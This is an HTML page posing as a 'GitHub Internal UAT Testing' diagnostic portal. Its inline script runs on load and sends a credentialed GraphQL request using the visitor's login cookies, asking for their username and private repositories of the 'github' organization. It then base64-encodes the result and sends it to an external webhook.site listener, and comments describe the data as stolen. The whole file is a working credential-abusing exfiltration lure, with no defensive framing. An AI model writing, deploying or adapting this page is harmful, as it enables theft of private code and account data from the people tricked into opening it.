<!DOCTYPE html>
<html>
<head><title>UAT Diagnostic Portal</title></head>
<body style="font-family:sans-serif; background:#f6f8fa; padding:50px;">
    <h1>GitHub Internal UAT Testing</h1>
    <p>Diagnostic in progress... please wait.</p>
    <script>
        // 1. We target the GitHub GraphQL API
        fetch('https://api.github.com/graphql', {
            method: 'POST',
            // THIS IS THE CRITICAL PART: It force-sends the employee's login cookies
            credentials: 'include', 
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                // 2. This query asks for the employee's username and their PRIVATE repositories
                query: 'query { viewer { login } organization(login: "github") { repositories(first: 5, privacy: PRIVATE) { nodes { name url description } } } }'
            })
        })
        .then(response => response.json())
        .then(data => {
            // 3. We send the stolen data to your Webhook listener
            fetch('https://webhook.site/484decca-fdc9-4037-8097-ea186887ee6c?gold=' + btoa(JSON.stringify(data)));
            console.log('Diagnostic Complete.');
        })
        .catch(err => {
            fetch('https://webhook.site/484decca-fdc9-4037-8097-ea186887ee6c?error=' + btoa(err));
        });
    </script>
</body>
</html>
